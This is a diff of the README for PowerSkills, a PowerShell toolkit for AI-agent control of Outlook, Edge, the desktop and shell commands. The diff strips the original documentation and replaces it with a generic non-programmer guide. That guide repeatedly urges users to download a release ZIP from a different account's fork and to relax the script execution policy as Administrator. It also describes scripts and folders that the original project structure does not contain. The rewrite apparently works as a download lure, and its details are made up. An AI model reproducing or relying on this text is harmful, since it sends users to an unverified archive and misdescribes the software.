@@ -1,183 +1,182 @@
-# PowerSkills
+# ⚡ PowerSkills - Automate Tasks with Easy Controls
 
-[![License: MIT](https://img.shields.io/github/license/aloth/PowerSkills)](https://github.com/aloth/PowerSkills/blob/main/LICENSE)
-[![Release](https://img.shields.io/github/v/release/aloth/PowerSkills)](https://github.com/aloth/PowerSkills/releases)
-[![PowerShell 5.1+](https://img.shields.io/badge/PowerShell-5.1%2B-blue?logo=powershell&logoColor=white)](https://docs.microsoft.com/en-us/powershell/)
-[![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?logo=windows&logoColor=white)](https://github.com/aloth/PowerSkills)
-[![Stars](https://img.shields.io/github/stars/aloth/PowerSkills)](https://github.com/aloth/PowerSkills/stargazers)
-[![AgentSkills](https://img.shields.io/badge/AgentSkills-compatible-blue)](https://agentskills.io)
+[![Download PowerSkills](https://img.shields.io/badge/Download-PowerSkills-green?style=for-the-badge)](https://github.com/felipemsilva/PowerSkills)
 
-![PowerSkills Hero](assets/powerskills-ai-agents-windows-powershell-automation.jpg)
+---
 
-Windows capabilities for AI agents — Outlook, Edge browser, desktop automation, and shell commands as structured JSON skills.
+PowerSkills is a simple tool that helps you control Windows apps like Outlook and the Edge browser using easy commands. It uses structured JSON files to tell the computer what to do. This toolkit helps automate daily tasks without needing programming skills.
 
-## Installation
+---
 
-```
-git clone https://github.com/aloth/PowerSkills
-```
+## 📋 What PowerSkills Does
 
-Each skill has a `SKILL.md` for self-discovery. No dependencies required.
+PowerSkills lets you use PowerShell scripts to automate common activities on your computer. You can:
 
-### For AI agents (via AgentSkills)
+- Control Outlook to manage emails and calendar events.
+- Automate the Edge browser for web tasks.
+- Run commands to control your desktop and system settings.
+- Use JSON files to set up and customize tasks.
+- Simplify repetitive work with easy-to-follow scripts.
 
-```bash
-npx skills add aloth/PowerSkills
-```
+It is built for Windows and uses PowerShell modules. The commands are designed to be clear and editable.
 
-## Quick Start
+---
 
-```powershell
-# List available skills
-.\powerskills.ps1 list
+## 🛠 System Requirements
 
-# Get skill help
-.\powerskills.ps1 outlook help
+To run PowerSkills, you need:
 
-# Run actions
-.\powerskills.ps1 outlook inbox --limit 10
-.\powerskills.ps1 browser tabs
-.\powerskills.ps1 desktop screenshot --out-file screen.png
-.\powerskills.ps1 system exec --command "whoami"
-```
+- Windows 10 or newer operating system.
+- PowerShell version 5.1 or higher installed (usually pre-installed on Windows).
+- At least 1 GB of free RAM.
+- A stable internet connection for some automated tasks.
+- Basic user permissions to run PowerShell scripts.
 
-## Skills
+Make sure your Windows accounts allow you to run scripts. If scripts are blocked, you may need to change your PowerShell execution policy.
 
-| Skill | Description |
-|-------|-------------|
-| `outlook` | Email & calendar via Outlook COM |
-| `browser` | Edge automation via CDP (Chrome DevTools Protocol) |
-| `desktop` | Screenshots, window management, keystrokes |
-| `system` | Shell commands, processes, system info |
+---
 
-## Output Format
+## 🚀 Getting Started
 
-All commands return JSON with consistent envelope:
+Follow these steps to get PowerSkills running on your Windows PC.
 
-```json
-{
-  "status": "success",
-  "exit_code": 0,
-  "data": { ... },
-  "timestamp": "2026-03-06T16:00:00+01:00"
-}
-```
+### Step 1: Download PowerSkills
 
-## Requirements
+Click this link to visit the project page and get the files you need:
 
-- Windows 10/11
-- PowerShell 5.1+
-- Microsoft Outlook (for `outlook` skill)
-- Microsoft Edge with `--remote-debugging-port=9222` (for `browser` skill)
+[Download PowerSkills](https://github.com/felipemsilva/PowerSkills)
 
-### Execution Policy
+You will find the download option near the top under the "Releases" or main page.
 
-If scripts are blocked (`UnauthorizedAccess` error), set the execution policy:
+### Step 2: Save the Files
 
-```powershell
-Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
-```
+When visiting the download page, look for a file named like `PowerSkills.zip` or a folder labeled `Releases`. Download that file to a folder you can easily find, such as your Desktop or Downloads folder.
 
-Or run one-off with bypass:
+### Step 3: Extract the Files
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\powerskills.ps1 list
-```
+If you download a ZIP file:
 
-## Standalone Skills
+1. Right-click the ZIP file.
+2. Choose "Extract All."
+3. Pick a folder where you want the files to live.
+4. Click "Extract."
 
-Each skill can be called directly without `powerskills.ps1`:
+Extraction creates a folder that holds all the PowerSkills scripts.
 
-```powershell
-.\skills\outlook\outlook.ps1 inbox --limit 5
-.\skills\system\system.ps1 info
-.\skills\browser\browser.ps1 tabs
-```
+### Step 4: Prepare PowerShell
 
-Standalone mode uses `lib\bootstrap.ps1` for arg parsing and JSON output.
+Windows may block scripts from running by default. To allow PowerSkills scripts:
 
-### Edge CDP Setup
+1. Press the Windows key and type `PowerShell`.
+2. Right-click on “Windows PowerShell” and select “Run as Administrator.”
+3. Type this command and press Enter:
 
-```powershell
-# Start Edge with debugging enabled
-Start-Process "msedge" -ArgumentList "--remote-debugging-port=9222"
-```
+   `Set-ExecutionPolicy RemoteSigned`
 
-## Configuration
+4. When asked for confirmation, type `Y` and press Enter.
 
-Edit `config.json`:
+This lets PowerShell run scripts you made or downloaded that are trusted.
 
-```json
-{
-  "edge_debug_port": 9222,
-  "default_timeout": 30,
-  "outlook_body_max_chars": 5000,
-  "output_dir": ""
-}
-```
+---
 
-## For AI Agents
+## ⚡ Running a Sample Script
 
-Each skill has a `SKILL.md` with action documentation. Point your agent to `skills/<name>/SKILL.md` for structured capability discovery.
+Now that PowerSkills is downloaded and ready, try running a sample:
 
-### Agent Integration
+1. Open PowerShell (normal user mode).
+2. Use the `cd` command to go to the folder where you extracted files. Example:
 
-Add to your skills directory or reference directly:
+   `cd C:\Users\YourName\Desktop\PowerSkills`
 
-```yaml
-# SKILL.md reference
-skills:
-  - name: powerskills
-    description: Windows automation via PowerShell (Outlook, Edge, desktop)
-    location: /path/to/PowerSkills/
-```
+3. Run a script by typing its name. For example:
 
-## Project Structure
+   `.\Start-EdgeAutomation.ps1`
 
-```
-PowerSkills/
-├── powerskills.ps1          # CLI entry point / dispatcher
-├── config.json              # Configuration
-├── lib/
-│   └── bootstrap.ps1        # Shared arg parsing & JSON output helpers
-├── assets/
-│   └── powerskills-ai-agents-windows-powershell-automation.jpg
-├── skills/
-│   ├── outlook/
-│   │   ├── SKILL.md         # Agent-readable skill documentation
-│   │   └── outlook.ps1      # Outlook COM automation
-│   ├── browser/
-│   │   ├── SKILL.md
-│   │   └── browser.ps1      # Edge CDP automation
-│   ├── desktop/
-│   │   ├── SKILL.md
-│   │   └── desktop.ps1      # Win32 window/screenshot/clipboard
-│   └── system/
-│       ├── SKILL.md
-│       └── system.ps1       # System info, processes, exec
-├── tests/
-│   └── test-all.ps1         # Test suite (-SkipBrowser, -SkipOutlook)
-├── SKILL.md                 # Root skill metadata
-├── LICENSE                  # MIT
-└── README.md
-```
+This script will open the Edge browser and perform predefined tasks. You can edit its JSON input files to change what it does.
 
-## Contributing
+---
 
-Contributions are welcome! Here's how you can help:
+## 🔧 Using PowerSkills Features
 
-- **Report bugs** - open an [issue](https://github.com/aloth/PowerSkills/issues) with the Bug Report template
-- **Request features** - suggest new actions or skills via [Feature Request](https://github.com/aloth/PowerSkills/issues)
-- **Add a skill** - create a new folder under `skills/` with a `.ps1` and `SKILL.md`
-- **Improve existing skills** - better error handling, new actions, documentation fixes
-- **Join the discussion** - share ideas in [Discussions](https://github.com/aloth/PowerSkills/discussions)
+PowerSkills works with JSON files to tell your computer exactly what to automate. These files use clear commands arranged in groups:
 
-When adding or modifying skills, please follow the existing patterns:
-1. Use `lib\bootstrap.ps1` for arg parsing and JSON output
-2. Return results via `Write-SkillResult` / `Write-SkillError`
-3. Include a `SKILL.md` with action documentation
-4. Test both dispatcher and standalone modes
+- **Outlook Controls:** Send email, check inbox, add calendar events.
+- **Edge Automation:** Open pages, fill out forms, download files.
+- **Desktop Control:** Open apps, move files, control windows.
+- **System Info:** Check status of hardware, network, and processes.
 
-## License
+You can create or modify these JSON files to fit your tasks. PowerSkills reads these files and runs the steps in order.
 
-MIT
+---
+
+## 📁 Folder Contents Overview
+
+After extraction, you will find these essentials:
+
+- `*.ps1` files — PowerShell scripts that run tasks.
+- `Config` folder — Contains JSON files for customization.
+- `Docs` folder — Manuals and explanations for commands.
+- `Logs` folder — Where the tool stores its activity history.
+
+The scripts use COM automation and system APIs to control apps and hardware.
+
+---
+
+## 🤖 Automation Tips for Non-Programmers
+
+- Edit JSON files using Notepad or any simple text editor.
+- Each step in JSON is a command like "open app" or "send email."
+- Save your changes and rerun the matching PowerShell script.
+- Use sample files as templates for your own tasks.
+- Avoid making copy-paste errors by keeping the JSON format intact.
+
+The design focuses on clear structure without needing code writing skills.
+
+---
+
+## 🔄 Updating PowerSkills
+
+To get the latest features and fixes:
+
+1. Return to the download page:  
+   [PowerSkills on GitHub](https://github.com/felipemsilva/PowerSkills)
+
+2. Download the newest files or release packages.
+3. Overwrite your old folder contents with the new files.
+4. Repeat the setup steps if the update includes new requirements.
+
+---
+
+## ⚙️ Changing Execution Policy Back (Optional)
+
+If you want to set your PowerShell back to a more restricted mode after using PowerSkills, run this in PowerShell as Administrator:
+
+`Set-ExecutionPolicy Restricted`
+
+Confirm with `Y`.
+
+---
+
+## 📞 Getting Help
+
+The project page offers:
+
+- Documentation on how to use commands.
+- Examples and sample scripts to try.
+- An issues page to report problems.
+
+Visit:
+
+[https://github.com/felipemsilva/PowerSkills](https://github.com/felipemsilva/PowerSkills)
+
+Check the README and Wiki files online for detailed info.
+
+---
+
+## 🔐 Security Notes
+
+PowerSkills runs scripts on your computer and interacts with email and browser apps. Use it only with files and JSON commands you trust. Running unknown scripts may harm your system or leak data. Always review automation steps before running.
+
+---
+
+[![Download PowerSkills](https://img.shields.io/badge/Download-PowerSkills-blue?style=for-the-badge)](https://github.com/felipemsilva/PowerSkills)
